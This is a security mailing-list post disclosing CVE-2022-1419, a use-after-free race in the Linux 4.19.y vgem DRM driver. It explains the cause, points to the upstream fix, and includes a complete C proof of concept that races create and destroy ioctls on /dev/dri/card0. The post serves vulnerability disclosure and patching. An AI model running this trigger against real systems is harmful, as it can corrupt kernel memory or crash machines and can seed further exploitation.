Received: (qmail 31891 invoked by uid 550); 21 Apr 2022 16:27:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30336 invoked from network); 21 Apr 2022 15:45:42 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=mime-version:from:date:message-id:subject:to;
        bh=5Cw3vL0WjMTbM+/GhU+J+ecbAF0oNjiV2js4hlg0L0A=;
        b=h2aFiEZQ7K9tx3Oyucwb8vwZo0Atl7ZE4hd91iyPa+wusCMxilECrs8ugVPqolPHpJ
         yzC3rJ0h5621kltG9l/fYejsI33BHviraziGjBMcFfmlDrJCkmcY0sY7nT4ze0yrCap9
         gjopSjXbqGmzNOOlQrudsrnqxiXB+BdS20kV/P2gG4y0xD8FfyMQ1rEm+Y2iFZPWvejT
         SIWNsv5QxFPuglKLNJJa4ytTERD7KIJQhLFy17M+V7ClOlKrJ/Kxb0JVHx5J3E8/dXxr
         nBxTYkjf5Bq6NcuyQbQPvBjCdm52thL3+TepGdu377VtFFWgqSFggIpcR/AN9nJkQP1K
         UJBA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=5Cw3vL0WjMTbM+/GhU+J+ecbAF0oNjiV2js4hlg0L0A=;
        b=VFlakE7FsebCqT+X3/K7beVAncu4s+lgmfS5dyS9M9vKNXgPoBJylEE4vSSfR3yIZ3
         XZ9fgy42J3EMbm2MX0gX0GHpsnKlEIApJZO4OPMKiTimR75sD3a3zxFxc5fZYQ5nWHjB
         +fj11bo6KHyAd9X9BsQYrQ/KU2iRu7ofcSv3nUDoBFNgvQUylhF55OJZx0abjZ4k8j25
         ScGAIcCAk7buBAQWQ4wvcHY9zXk0B/kzPSNuhJYSFf1SlMD9yGJqqCBYn0P5OcH4SSlW
         N9RtpLCvcgwzM2sEj/uqFzpZZLRp159Uf1Z69Mz7n1Ft1c9C2SiFf+SaMqrRr7M7d9w1
         hXjA==
X-Gm-Message-State: AOAM5303hvDkm84gVKwWyYa57AqBBzgQhicIsahbGkGNWGx572HywwSr
	bpGa+16OorUYx4F0bFniep6lE4UV0Wlia5/lHRi19HT3n0Q=
X-Google-Smtp-Source: ABdhPJy+vOuP33ZjyVkZCvp1Q15Q7KAStAeqg2IbSnqqsaX9L6s9hLrOS6X2OGq35Y7Q7i37Nk0hITRuJKoP4tttpcM=
X-Received: by 2002:a81:1d49:0:b0:2eb:debc:1a91 with SMTP id
 d70-20020a811d49000000b002ebdebc1a91mr284226ywd.390.1650555930632; Thu, 21
 Apr 2022 08:45:30 -0700 (PDT)
MIME-Version: 1.0
From: Minh Yuan <yuanmingbuaa@gmail.com>
Date: Thu, 21 Apr 2022 23:44:54 +0800
Message-ID: <CAH5WSp5hx0pPjhbUoyduc-Nk7fW12pLsJqBFFQ9S4p7ZdgkHcg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000ed67aa05dd2bffcd"
Subject: [oss-security] CVE-2022-1419: Linux kernel: A concurrency use-after-free in vgem_gem_dumb_create

--000000000000ed67aa05dd2bffcd
Content-Type: text/plain; charset="UTF-8"

Hi guys,

I recently discovered a race uaf in the latest 4.19.y kernel ( v4.19.239
for now ).

The root cause of this vulnerability is that the
ioctl$DRM_IOCTL_MODE_DESTROY_DUMB can decrease refcount of
*drm_vgem_gem_object *(created in *vgem_gem_dumb_create*) concurrently,
and  *vgem_gem_dumb_create *will access the freed drm_vgem_gem_object.

I noticed that this race issue is fixed in commit 4b848f2 (drm/vgem: Close
use-after-free race in vgem_gem_create) for linux 5.x, so a backport to
4.19.y is needed  ...

My unstable PoC (tested on Linux 4.19.239, it needs the privilege to access
drm to trigger this bug.)

#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/xattr.h>
#include <sys/shm.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <drm/drm.h>
#include <drm/drm_mode.h>

#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
} while (0)
int fd;
void *thread1(void *arg)
{
struct drm_mode_create_dumb *args = (struct drm_mode_create_dumb *)malloc(
sizeof(struct drm_mode_create_dumb));
memset(args,0,sizeof(struct drm_mode_create_dumb));
args->width = 10;
args->height = 10;
args->bpp = 1;
ioctl(fd, DRM_IOCTL_MODE_CREATE_DUMB, args);
}
void *thread2(void *arg)
{
struct drm_mode_destroy_dumb *args = (struct drm_mode_destroy_dumb *)malloc(
sizeof(struct drm_mode_destroy_dumb));
memset(args,0,sizeof( struct drm_mode_destroy_dumb));
args->handle = 1;
ioctl(fd, DRM_IOCTL_MODE_DESTROY_DUMB, args);

}

int main(void)

{
pthread_t thr1,thr2;
fd = open("/dev/dri/card0",0);

int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
if(s != 0)
errExit("pthread_create");
s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
if(s != 0)
errExit("pthread_create");
pthread_join(thr1,NULL);
pthread_join(thr2,NULL);

close(fd);

}


Timeline:
* 21.04.22 - Vulnerability reported to security@kernel.org and
linux-distros@vs.openwall.org
* 21.04.22 - CVE-2022-1419 assigned.
* 21.04.22 - Vulnerability opened.

Regards,

Yuan Ming from Tsinghua University

--000000000000ed67aa05dd2bffcd--
